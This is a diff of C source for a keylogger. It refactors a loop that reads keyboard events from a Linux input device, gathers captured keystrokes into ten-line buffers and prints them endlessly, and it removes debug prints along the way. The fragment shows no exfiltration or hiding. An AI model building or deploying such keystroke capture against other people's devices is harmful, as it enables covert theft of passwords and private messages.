@@ -132,7 +132,6 @@ char* inputBuffer(int argc, char **argv, char *eventName, int *temporaryBufferCo
 
                 // value 0 is down, value 1 is up
                 if (eventInput.type == EV_KEY && eventInput.value == 0) {
-                        printf("Keyboard input\n");
 			int result = interpretCharacter(outputBuffer, &eventInput, &bufferIndex);
 			/*
 				1 : Success
@@ -164,9 +163,7 @@ char* inputBuffer(int argc, char **argv, char *eventName, int *temporaryBufferCo
         }
 }
 
-int main(int argc, char **argv) {
-        // Access which entry holds our keyboard
-        char* result = getEvent();
+char* keylogBufferRecieve(int argc, char** argv, char* eventFileName) {
 	char* lineBuffer = (char *)malloc(sizeof(char) * BUFFER_SIZE);
         int lineCounter = 0; // Keeps track of how many lines have been recieved by the
 			     // inputBuffer function
@@ -179,13 +176,10 @@ int main(int argc, char **argv) {
                         - Wait for next input
         */
 
-	printf("Dead\n");
         while (lineCounter <= BUFFER_GOAL) {
-		printf("Alive\n");
-
                // Begin tracking an input buffer for key presses on that event
                 int temporaryBufferCount = BUFFER_SIZE;
-		char* recievedBuffer = inputBuffer(argc, argv, result, &temporaryBufferCount);
+		char* recievedBuffer = inputBuffer(argc, argv, eventFileName, &temporaryBufferCount);
 
 		// Update lineBufferSize for temporaryBufferCount increase
 		lineBufferSize += temporaryBufferCount + 10;
@@ -193,7 +187,6 @@ int main(int argc, char **argv) {
 
 		// Add
 		strcat(lineBuffer, recievedBuffer);
-		printf("%s", lineBuffer);
 
                 // Garbage collection
                 if (recievedBuffer != NULL) {
@@ -205,7 +198,25 @@ int main(int argc, char **argv) {
 		lineCounter += 1;
         }
 
-        // Free result
+	return lineBuffer;
+}
+
+int main(int argc, char **argv) {
+        // Access which entry holds our keyboard
+	char* result = getEvent();
+	char* keylogBuffer = NULL;
+
+	while (1) {
+		keylogBuffer = keylogBufferRecieve(argc, argv, result);
+		printf("Ten Line Buffer: {%s}\n", keylogBuffer);
+
+		// Memory management
+		free(keylogBuffer);
+		keylogBuffer = NULL;
+	}
+
+
+        // Memory Management
         free(result);
         result = NULL;
 
